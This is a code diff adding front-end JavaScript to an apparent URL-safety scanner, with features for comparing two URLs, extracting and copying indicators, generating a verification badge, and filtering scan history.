+  if (btn) btn.addEventListener('click', compareURLs);
+}
+
+async function compareURLs() {
+  const urlA = document.getElementById('compare-url-a')?.value.trim();
+  const urlB = document.getElementById('compare-url-b')?.value.trim();
+
+  if (!urlA || !urlB) { showError('Comparison Error', 'Please enter both URLs to compare.'); return; }
+
+  const resultsDiv = document.getElementById('compare-results');
+  resultsDiv.classList.remove('hidden');
+
+  const panelA = document.getElementById('compare-result-a');
+  const panelB = document.getElementById('compare-result-b');
+  panelA.innerHTML = '<div class="comparing-loader">Analyzing...</div>';
+  panelB.innerHTML = '<div class="comparing-loader">Analyzing...</div>';
+
+  try {
+    const [respA, respB] = await Promise.allSettled([
+      fetch(API.analyze, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url: urlA }) }).then(r => r.json()),
+      fetch(API.analyze, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url: urlB }) }).then(r => r.json()),
+    ]);
+
+    panelA.innerHTML = renderCompareResult(respA.status === 'fulfilled' ? respA.value : null, urlA);
+    panelB.innerHTML = renderCompareResult(respB.status === 'fulfilled' ? respB.value : null, urlB);
+  } catch (err) {
+    panelA.innerHTML = '<p class="compare-error">Analysis failed</p>';
+    panelB.innerHTML = '<p class="compare-error">Analysis failed</p>';
+  }
+
+  if (typeof lucide !== 'undefined') lucide.createIcons();
+}
+
+function renderCompareResult(data, url) {
+  if (!data || !data.success) return `<div class="compare-error">Analysis failed for this URL</div>`;
+  const a = data.analysis;
+  const p = a.parsed || {};
+  const verdictClass = a.verdict.toLowerCase();
+  return `
+    <div class="compare-url font-mono">${escapeHTML(url)}</div>
+    <div class="compare-verdict compare-verdict--${verdictClass}">${escapeHTML(a.verdict)}</div>
+    <div class="compare-metrics">
+      <div class="compare-metric"><span class="compare-metric-label">Risk</span><span class="compare-metric-value">${a.score}/100</span></div>
+      <div class="compare-metric"><span class="compare-metric-label">Confidence</span><span class="compare-metric-value">${(a.confidence || '').toUpperCase()}</span></div>
+    </div>
+    <div class="compare-details">
+      <div class="compare-detail"><span>Scheme</span><span class="font-mono">${escapeHTML(p.scheme || '—')}</span></div>
+      <div class="compare-detail"><span>Hostname</span><span class="font-mono">${escapeHTML(a.actual_hostname || p.hostname || '—')}</span></div>
+      <div class="compare-detail"><span>Path</span><span class="font-mono">${escapeHTML(p.path || '/')}</span></div>
+      <div class="compare-detail"><span>Userinfo (@)</span><span>${p.has_userinfo ? '⚠ Yes' : 'No'}</span></div>
+      <div class="compare-detail"><span>Findings</span><span>${(a.findings || []).length} detected</span></div>
+    </div>
+    ${(a.findings || []).length ? `<div class="compare-findings">${(a.findings || []).map(f => `<div class="compare-finding"><span>${escapeHTML(f.title)}</span><span class="severity-badge ${escapeHTML(f.severity)}">${escapeHTML(f.severity)}</span></div>`).join('')}</div>` : '<div class="compare-clean">No structural risks detected</div>'}
+  `;
+}
+
+// ============================================================================
+// IOC EXTRACTION
+// ============================================================================
+function initIOC() {
+  const copyBtn = document.getElementById('copy-ioc-btn');
+  if (copyBtn) copyBtn.addEventListener('click', copyIOC);
+}
+
+function renderIOC(analysis) {
+  const panel = document.getElementById('ioc-panel');
+  const grid = document.getElementById('ioc-grid');
+  if (!panel || !grid) return;
+
+  const p = analysis.parsed || {};
+  const indicators = [
+    { label: 'Hostname', value: analysis.actual_hostname || p.hostname || '—' },
+    { label: 'Scheme', value: p.scheme || '—' },
+    { label: 'Port', value: p.port ? String(p.port) : 'Default' },
+    { label: 'Path', value: p.path || '/' },
+    { label: 'Query', value: p.query || 'None' },
+    { label: 'Userinfo', value: p.has_userinfo ? 'Yes (Deceptive)' : 'No' },
+    { label: 'Punycode', value: p.is_punycode ? `Yes — ${p.unicode_hostname || 'IDN'}` : 'No' },
+    { label: 'Shortener', value: (analysis.findings || []).some(f => f.rule_id?.includes('SHORTENER')) ? 'Detected' : 'No' },
+    { label: 'Lookalike', value: (analysis.findings || []).some(f => f.rule_id?.includes('LOOKALIKE') || f.rule_id?.includes('BRAND')) ? 'Detected' : 'No' },
+  ];
+
+  grid.innerHTML = indicators.map(ind => `
+    <div class="ioc-item">
+      <span class="ioc-label">${escapeHTML(ind.label)}</span>
+      <span class="ioc-value font-mono">${escapeHTML(ind.value)}</span>
+    </div>
+  `).join('');
+
+  panel.classList.remove('hidden');
+}
+
+function copyIOC() {
+  const a = window._lastAnalysis;
+  if (!a) return;
+  const p = a.parsed || {};
+  const lines = [
+    `Hostname: ${a.actual_hostname || p.hostname || '—'}`,
+    `Scheme: ${p.scheme || '—'}`,
+    `Port: ${p.port || 'Default'}`,
+    `Path: ${p.path || '/'}`,
+    `Query: ${p.query || 'None'}`,
+    `Userinfo: ${p.has_userinfo ? 'Yes (Deceptive)' : 'No'}`,
+    `Punycode: ${p.is_punycode ? 'Yes' : 'No'}`,
+  ];
+  navigator.clipboard.writeText(lines.join('\n')).then(() => {
+    const btn = document.getElementById('copy-ioc-btn');
+    if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = '<i data-lucide="copy"></i> Copy Indicators'; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
+  }).catch(() => {});
+}
+
+// ============================================================================
+// BADGE
+// ============================================================================
+function initBadge() {
+  const btn = document.getElementById('generate-badge-btn');
+  if (btn) btn.addEventListener('click', generateBadge);
+  const copyBtn = document.getElementById('copy-badge-btn');
+  if (copyBtn) copyBtn.addEventListener('click', copyBadge);
+}
+
+async function generateBadge() {
+  const url = document.getElementById('badge-url-input')?.value.trim();
+  if (!url) return;
+
+  const btn = document.getElementById('generate-badge-btn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+
+  try {
+    const response = await fetch(API.badge, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url }),
+    });
+    const data = await response.json();
+    if (data.success) {
+      document.getElementById('badge-verdict-text').textContent = data.verdict;
+      document.getElementById('badge-verdict-text').className = `badge-verdict badge-verdict--${data.verdict.toLowerCase()}`;
+      document.getElementById('badge-score-text').textContent = String(data.score);
+      document.getElementById('badge-confidence-text').textContent = (data.confidence || '').toUpperCase();
+      document.getElementById('badge-result').classList.remove('hidden');
+    }
+  } catch (err) {
+    showError('Badge Error', getReadableError(err));
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '<i data-lucide="shield-check"></i> Generate Badge';
+    if (typeof lucide !== 'undefined') lucide.createIcons();
+  }
+}
+
+function copyBadge() {
+  const verdict = document.getElementById('badge-verdict-text')?.textContent || '';
+  const score = document.getElementById('badge-score-text')?.textContent || '';
+  const confidence = document.getElementById('badge-confidence-text')?.textContent || '';
+  const badge = `CYBERSAFE VERIFIED | ${verdict} | Risk: ${score} | Confidence: ${confidence}`;
+  navigator.clipboard.writeText(badge).then(() => {
+    const btn = document.getElementById('copy-badge-btn');
+    if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = '<i data-lucide="copy"></i> Copy Badge Code'; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
+  }).catch(() => {});
+}
+
+// ============================================================================
+// FULL HISTORY TAB
+// ============================================================================
+function initFullHistory() {
+  renderFullHistory();
+
+  const filterInput = document.getElementById('history-filter');
+  if (filterInput) filterInput.addEventListener('input', renderFullHistory);
+
+  const verdictFilter = document.getElementById('history-verdict-filter');
+  if (verdictFilter) verdictFilter.addEventListener('change', renderFullHistory);
+
+  const clearBtn = document.getElementById('clear-all-history');
+  if (clearBtn) clearBtn.addEventListener('click', () => { clearHistory(); renderFullHistory(); });
+}
+
+function renderFullHistory() {
+  const list = document.getElementById('full-history-list');
+  const emptyState = document.getElementById('history-empty-state');
+  if (!list) return;
+
+  const searchTerm = (document.getElementById('history-filter')?.value || '').toLowerCase();
+  const verdictFilter = document.getElementById('history-verdict-filter')?.value || '';
+
+  let items = scanHistory;
+  if (searchTerm) items = items.filter(i => i.url?.toLowerCase().includes(searchTerm));
+  if (verdictFilter) items = items.filter(i => i.verdict === verdictFilter);
+
+  // Remove existing items but keep empty state
+  list.querySelectorAll('.history-full-item').forEach(el => el.remove());
+
+  if (!items.length) {
+    if (emptyState) emptyState.classList.remove('hidden');
+    return;
+  }
+  if (emptyState) emptyState.classList.add('hidden');
+
+  items.forEach((item, i) => {
+    const el = document.createElement('div');
+    el.className = 'history-full-item';
+    el.innerHTML = `
+      <div class="history-full-top">
+        <span class="history-verdict ${escapeHTML(item.verdict)}">${escapeHTML(item.verdict)}</span>
+        <span class="history-full-score font-mono">Score: ${item.score ?? '—'}</span>
+        <span class="history-full-findings">${item.findingCount ?? 0} findings</span>
+        <span class="history-full-time">${escapeHTML(formatTimestamp(item.timestamp))}</span>
+      </div>
+      <div class="history-full-url font-mono">${escapeHTML(item.url || '')}</div>
+    `;
+    el.addEventListener('click', () => { urlInput.value = item.url || ''; switchToTab('scan'); });
+    list.appendChild(el);
+  });
 }
 
 // ============================================================================
